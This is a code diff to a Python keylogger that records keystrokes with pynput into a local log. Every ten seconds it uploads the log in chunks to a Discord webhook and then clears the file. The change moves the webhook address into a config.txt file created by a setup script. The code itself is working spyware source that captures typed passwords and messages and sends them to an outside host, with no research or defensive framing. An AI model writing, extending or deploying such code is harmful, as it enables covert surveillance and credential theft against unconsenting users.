@@ -1,15 +1,20 @@
 import os
 import time
-import socket
 import threading
 import requests
 from pynput import keyboard
 from datetime import datetime
 
 # ===========================
-# CONFIG
+# LOAD DISCORD WEBHOOK
 # ===========================
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/PUT-YOUR-WEBHOOK-HERE"
+if os.path.exists("config.txt"):
+    with open("config.txt", "r") as f:
+        DISCORD_WEBHOOK = f.read().strip()
+else:
+    print("[!] No config.txt found. Please run setup_client_discord.bat first.")
+    exit(1)
+
 SEND_INTERVAL = 10  # seconds
 LOG_DIR = "logs"
 LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")
@@ -75,11 +80,11 @@ def send_logs():
                 with open(LOG_FILE, "r", encoding="utf-8") as f:
                     data = f.read()
 
-                # Send to Discord in chunks if large
+                # Send in chunks (Discord limit ~2000 chars)
                 for i in range(0, len(data), 1900):
                     send_to_discord(data[i:i+1900])
 
-                open(LOG_FILE, "w").close()  # Clear log after sending
+                open(LOG_FILE, "w").close()  # Clear log
                 print("[+] Sent logs to Discord")
         except Exception as e:
             print(f"[!] Send error: {e}")
